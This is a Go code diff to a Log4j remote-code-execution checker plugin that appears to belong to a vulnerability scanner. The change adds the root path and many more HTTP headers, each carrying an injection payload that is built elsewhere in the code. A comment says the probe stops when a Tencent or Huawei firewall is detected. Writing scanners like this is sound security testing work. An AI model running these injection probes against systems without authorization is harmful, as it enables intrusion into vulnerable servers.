@@ -69,6 +69,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	}
 
 	reqPaths := []string{
+		"/",
 		"/admin",
 		"/login",
 		"/signin",
@@ -128,6 +129,8 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("X-Request-ID", fullPayload)
 					request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+					request.Header.Set("X-Api-Version", fullPayload)
+					request.Header.Set("TraceID", fullPayload)
 					resp, err := util.RequestDo(request, false)
 
 					// 存在腾讯门神防火墙或者华为防火墙的情况下执行return false
@@ -146,8 +149,22 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("X-Forwarded-For", fullPayload)
 					request.Header.Set("Client-ip", fullPayload)
 					request.Header.Set("Cookie", fullPayload)
-					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 					request.Header.Set("Authorization", fullPayload)
+					request.Header.Set("X-Forwarded-Ssl", fullPayload)
+					request.Header.Set("X-Forwarded-For-Original", fullPayload)
+					request.Header.Set("X-Forwarded-Host", fullPayload)
+					request.Header.Set("X-Forwarded-Proto", fullPayload)
+					request.Header.Set("True-Client-IP", fullPayload)
+					request.Header.Set("DNT", fullPayload)
+					request.Header.Set("X-CSRFToken", fullPayload)
+					request.Header.Set("CSRFToken", fullPayload)
+					request.Header.Set("JWT", fullPayload)
+					request.Header.Set("X-HTTP-Method-Override", fullPayload)
+					request.Header.Set("X-Request-ID", fullPayload)
+					request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
+					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+					request.Header.Set("X-Api-Version", fullPayload)
+					request.Header.Set("TraceID", fullPayload)
 					_, _ = util.RequestDo(request, false)
 				}
 				// fmt.Println(count)
